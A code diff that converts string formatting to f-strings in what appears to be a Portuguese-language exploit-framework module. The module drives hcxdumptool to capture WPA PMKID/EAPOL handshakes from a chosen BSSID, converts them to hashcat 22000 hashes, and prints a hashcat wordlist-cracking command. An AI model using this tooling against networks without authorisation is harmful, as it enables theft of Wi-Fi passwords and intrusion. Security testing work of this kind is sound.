@@ -93,7 +93,7 @@ class Exploit(Exploit):
                 fh.write("\n".join(macs) + "\n")
             return fpath
         except OSError as exc:
-            print_error("Não foi possível escrever filterlist: {}".format(exc))
+            print_error(f"Não foi possível escrever filterlist: {exc}")
             return None
 
     def _build_capture_cmd(self, bin_path: str, out_file: str) -> List[str]:
@@ -106,13 +106,13 @@ class Exploit(Exploit):
 
         ch_list = str(self.channel_list).strip()
         if ch_list:
-            cmd.append("--chan={}".format(ch_list))
+            cmd.append(f"--chan={ch_list}")
 
         target = str(self.target_bssid).strip()
         if target:
             fl = self._filterlist_file(target)
             if fl:
-                cmd.extend(["--filterlist_ap={}".format(fl), "--filtermode=2"])
+                cmd.extend([f"--filterlist_ap={fl}", "--filtermode=2"])
 
         return cmd
 
@@ -157,11 +157,11 @@ class Exploit(Exploit):
         cmd_str = " ".join(cmd)
 
         if self.dry_run:
-            print_info("DRY RUN — {}".format(cmd_str))
+            print_info(f"DRY RUN — {cmd_str}")
             return
 
-        print_status("hcxdumptool: captura PMKID/EAPOL em {}".format(out_file))
-        print_info("Comando: {}".format(cmd_str))
+        print_status(f"hcxdumptool: captura PMKID/EAPOL em {out_file}")
+        print_info(f"Comando: {cmd_str}")
 
         timeout = int(self.timeout) if int(self.timeout) > 0 else None
         try:
@@ -169,11 +169,11 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             print_info("\nCaptura interrompida pelo usuário.")
         except subprocess.TimeoutExpired:
-            print_info("Timeout ({:d}s) atingido.".format(int(self.timeout)))
+            print_info(f"Timeout ({int(self.timeout):d}s) atingido.")
         except PermissionError:
             print_error("Permissão negada. Execute com sudo/root.")
         except Exception as exc:
-            print_error("Erro hcxdumptool: {}".format(exc))
+            print_error(f"Erro hcxdumptool: {exc}")
 
         # Convert after capture
         if self.convert_after and os.path.isfile(out_file):
@@ -183,18 +183,18 @@ class Exploit(Exploit):
                 return
             hash_out = str(self.hash_output).strip() or (out_file + ".hc22000")
             conv_cmd = [hcxpng, "-o", hash_out, out_file]
-            print_status("Convertendo para hash 22000: {}".format(hash_out))
+            print_status(f"Convertendo para hash 22000: {hash_out}")
             try:
                 result = subprocess.run(conv_cmd, capture_output=True, text=True, check=False)
                 if result.stdout:
                     print_info(result.stdout.strip())
                 if result.returncode == 0 and os.path.isfile(hash_out):
                     size = os.path.getsize(hash_out)
-                    print_success("Hash 22000 gerado: {} ({} bytes)".format(hash_out, size))
+                    print_success(f"Hash 22000 gerado: {hash_out} ({size} bytes)")
                     print_info(
-                        "Hashcat: hashcat -m 22000 {} /path/to/wordlist.txt".format(hash_out)
+                        f"Hashcat: hashcat -m 22000 {hash_out} /path/to/wordlist.txt"
                     )
                 else:
                     print_info("Nenhum hash extraído (pode não haver PMKID/EAPOL na captura).")
             except Exception as exc:
-                print_error("Erro ao converter: {}".format(exc))
+                print_error(f"Erro ao converter: {exc}")
